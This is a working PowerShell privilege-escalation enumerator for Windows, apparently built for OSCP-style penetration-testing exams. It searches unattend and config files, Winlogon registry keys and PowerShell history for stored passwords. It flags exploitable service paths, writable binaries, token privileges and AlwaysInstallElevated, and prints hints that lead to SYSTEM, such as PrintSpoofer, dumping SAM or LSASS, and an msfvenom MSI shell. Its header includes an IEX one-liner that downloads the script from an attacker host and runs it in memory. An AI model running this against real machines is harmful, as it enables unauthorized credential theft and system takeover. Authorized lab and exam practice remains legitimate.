# win_enum.ps1 - Windows privesc enumerator (OSCP-safe, no banned tools)
# Usage: powershell -ep bypass -File win_enum.ps1
# Or in-memory: powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://KALI:8000/win_enum.ps1')"

function H($t)  { Write-Host "`n[*] $t" -ForegroundColor Cyan }
function OK($t) { Write-Host "    $t" -ForegroundColor Green }
function HI($t) { Write-Host "    $t" -ForegroundColor Yellow }
function BAD($t){ Write-Host "    $t" -ForegroundColor Red }

# ---------- 1. Identity & Privileges ----------
H "Identity & Privileges   (manual: whoami /all)"
OK (whoami)
$priv = whoami /priv
$priv
if ($priv -match "SeImpersonate|SeAssignPrimaryToken") {
    BAD "SeImpersonate/AssignPrimaryToken -> GodPotato / PrintSpoofer => SYSTEM"
}
if ($priv -match "SeBackupPrivilege") { BAD "SeBackup -> reg save SAM/SYSTEM -> secretsdump -> PTH" }
if ($priv -match "SeDebugPrivilege")  { BAD "SeDebug -> dump LSASS (procdump)" }
if ($priv -match "SeLoadDriver")      { BAD "SeLoadDriver -> malicious driver" }
if ($priv -match "SeTakeOwnership")   { BAD "SeTakeOwnership -> takeown + icacls any file" }

# ---------- 2. OS & Patch Level ----------
H "OS & Patch Level   (manual: systeminfo)"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 3 | Format-Table
HI "Old/unpatched OS -> kernel exploits -> see 04h guide / searchsploit <build>"

# ---------- 3. Users & Admins ----------
H "Users & Local Admins   (manual: net users / net localgroup administrators)"
net users
net localgroup administrators

# ---------- 4. Stored Credentials ----------
H "Stored Credentials   (manual: cmdkey /list, reg query Winlogon)"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | findstr /I "DefaultUserName DefaultPassword AutoAdminLogon"
cmdkey /list
HI "Saved creds -> runas /savecred /user:<name> cmd"

# ---------- 5. Unquoted Service Paths ----------
H "Unquoted Service Paths   (manual: wmic service get name,pathname)"
$u = Get-CimInstance win32_service | Where-Object {
    $_.PathName -match "^[A-Za-z]:" -and $_.PathName -notmatch '"' -and
    $_.PathName -match " " -and $_.PathName -notmatch "system32"
}
if ($u) {
    $u | Select-Object Name,PathName,StartMode | Format-List
    BAD "Check write perms on each truncation dir: icacls <dir> -> drop <truncated>.exe -> restart"
} else { OK "none found" }

# ---------- 6. Writable Service Binaries ----------
H "Writable Service Binaries   (manual: icacls <binary>)"
foreach ($s in (Get-CimInstance win32_service)) {
    $p = ($s.PathName -replace '"','' -split ' ')[0]
    if ($p -and (Test-Path $p -ErrorAction SilentlyContinue)) {
        $acl = icacls $p 2>$null | Out-String
        if ($acl -match "Everyone.*\((F|M|W)\)|BUILTIN\\Users.*\((F|M|W)\)") {
            BAD "$($s.Name): $p is WRITABLE -> replace binary, sc stop/start"
        }
    }
}
HI "Also check service DACLs: sc sdshow <svc>  |  accesschk.exe -uwcqv `"Authenticated Users`" *"

# ---------- 7. AlwaysInstallElevated ----------
H "AlwaysInstallElevated   (manual: reg query HKLM+HKCU Installer)"
$a1 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$a2 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($a1 -eq 1 -and $a2 -eq 1) {
    BAD "Both =1 -> msfvenom -f msi -> msiexec /quiet /qn /i shell.msi => SYSTEM"
} else { OK "not set (HKLM=$a1 HKCU=$a2)" }

# ---------- 8. Scheduled Tasks ----------
H "Scheduled Tasks running as SYSTEM   (manual: schtasks /query /fo LIST /v)"
schtasks /query /fo LIST 2>$null | findstr /I "TaskName Run As Task To Run" | Select-Object -First 40
HI "Writable task binary? -> replace -> schtasks /run /tn <name>"

# ---------- 9. High-Value Files ----------
H "Config / Credential Files   (manual: findstr /si password *.xml *.config)"
$files = @("C:\Windows\Panther\unattend.xml","C:\unattend.xml","C:\sysprep.inf",
           "C:\Windows\System32\sysprep\sysprep.xml","C:\inetpub\wwwroot\web.config")
$files += Get-ChildItem "C:\Program Files","C:\Program Files (x86)" -Recurse -Depth 2 -Include "*.config","*.ini" -ErrorAction SilentlyContinue | ForEach-Object {$_.FullName}
foreach ($f in $files) {
    if (Test-Path $f) {
        BAD $f
        Select-String -Path $f -Pattern "pass|user|key|cred" -ErrorAction SilentlyContinue | Select-Object -First 5
    }
}
$pshist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $pshist) { BAD "PS history exists: $pshist"; Get-Content $pshist -Tail 20 }

# ---------- 10. Listening Services ----------
H "Listening Ports   (manual: netstat -ano | findstr LISTEN)"
netstat -ano | findstr LISTEN
HI "127.0.0.1-only services -> reachable post-foothold, often unpatched"

# ---------- 11. Defenses ----------
H "Defenses"
Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled,RealTimeProtectionEnabled
Get-Service -Name *defend*,*sophos*,*carbon*,*crowd* -ErrorAction SilentlyContinue | Select-Object Name,Status

Write-Host "`n[+] Done. Verify red/yellow items manually before exploiting." -ForegroundColor Cyan
Write-Host "    Guides: 04a services | 04b unquoted | 04c potato | 04d tasks | 04e creds | 04f registry | 04g dll/path | 04h kernel" -ForegroundColor Cyan
